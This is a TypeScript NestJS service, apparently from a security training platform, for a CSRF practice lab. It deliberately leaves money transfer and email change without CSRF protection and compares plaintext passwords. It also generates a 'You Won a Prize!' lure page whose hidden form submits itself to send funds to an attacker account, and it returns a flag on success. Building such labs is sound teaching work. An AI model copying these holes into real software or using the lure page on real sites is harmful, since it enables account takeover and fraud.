import {
  Injectable,
  BadRequestException,
  UnauthorizedException,
} from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';

@Injectable()
export class Lab1Service {
  private sessions = new Map<string, string>(); // sessionId -> username

  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
  ) {}

  async initLab(userId: string, labId: string) {
    this.sessions.clear();
    return this.stateService.initializeState(userId, labId);
  }

  async login(
    userId: string,
    labId: string,
    username: string,
    password: string,
  ) {
    const user = await this.prisma.labGenericUser.findFirst({
      where: { userId, labId, username, password },
    });

    if (!user) {
      throw new UnauthorizedException('Invalid credentials');
    }

    const sessionId = `sess_${Date.now()}_${Math.random()}`;
    this.sessions.set(sessionId, username);

    return { success: true, sessionId, user };
  }

  // ❌ الثغرة: No CSRF protection على state-changing operation
  async transferMoney(
    userId: string,
    labId: string,
    sessionId: string,
    toAccount: string,
    amount: number,
  ) {
    const username = this.sessions.get(sessionId);
    if (!username) {
      throw new UnauthorizedException('Invalid session');
    }

    // جلب حساب المستخدم
    const fromAccount = await this.prisma.labGenericBank.findFirst({
      where: { userId, labId, accountNo: 'ACC-VICTIM' },
    });

    if (!fromAccount) {
      throw new BadRequestException('Account not found');
    }

    if (fromAccount.balance < amount) {
      throw new BadRequestException('Insufficient balance');
    }

    // تنفيذ التحويل بدون CSRF token!
    await this.prisma.labGenericBank.update({
      where: { id: fromAccount.id },
      data: { balance: { decrement: amount } },
    });

    // تسجيل العملية
    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'TRANSFER',
        meta: { from: 'ACC-VICTIM', to: toAccount, amount },
      },
    });

    // التحقق من الاستغلال
    const transfers = await this.prisma.labGenericLog.count({
      where: { userId, labId, type: 'TRANSFER' },
    });

    if (transfers >= 1) {
      return {
        success: true,
        message: `Transferred ${amount}$ to ${toAccount}`,
        exploited: true,
        flag: 'FLAG{CSRF_ATTACK_SUCCESS}',
        warning: 'CSRF vulnerability! Transfer executed without CSRF token',
      };
    }

    return {
      success: true,
      message: `Transferred ${amount}$ to ${toAccount}`,
    };
  }

  // ❌ الثغرة: State-changing operation بدون CSRF protection
  async updateEmail(
    userId: string,
    labId: string,
    sessionId: string,
    newEmail: string,
  ) {
    const username = this.sessions.get(sessionId);
    if (!username) {
      throw new UnauthorizedException('Invalid session');
    }

    const user = await this.prisma.labGenericUser.findFirst({
      where: { userId, labId, username },
    });

    if (!user) {
      throw new BadRequestException('User not found');
    }

    // تحديث الإيميل بدون CSRF protection!
    await this.prisma.labGenericUser.update({
      where: { id: user.id },
      data: { email: newEmail },
    });

    return {
      success: true,
      message: 'Email updated successfully',
      newEmail,
    };
  }

  async getBalance(userId: string, labId: string, sessionId: string) {
    const username = this.sessions.get(sessionId);
    if (!username) {
      throw new UnauthorizedException('Invalid session');
    }

    const account = await this.prisma.labGenericBank.findFirst({
      where: { userId, labId },
    });

    return { balance: account?.balance || 0 };
  }

  // Generate malicious HTML page للاختبار
  async generateAttackPage(userId: string, labId: string, targetUrl: string) {
    const html = `
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Congratulations! Click to claim your prize</h1>
    <form id="csrf-form" action="${targetUrl}" method="POST" style="display:none;">
        <input name="toAccount" value="ATTACKER-ACC" />
        <input name="amount" value="500" />
        <input name="sessionId" value="VICTIM_SESSION_HERE" />
    </form>
    <button onclick="document.getElementById('csrf-form').submit()">Claim Prize</button>
    <script>
        // Auto-submit after 2 seconds
        setTimeout(() => {
            document.getElementById('csrf-form').submit();
        }, 2000);
    </script>
</body>
</html>
    `;

    return { html, message: 'CSRF attack page generated' };
  }
}
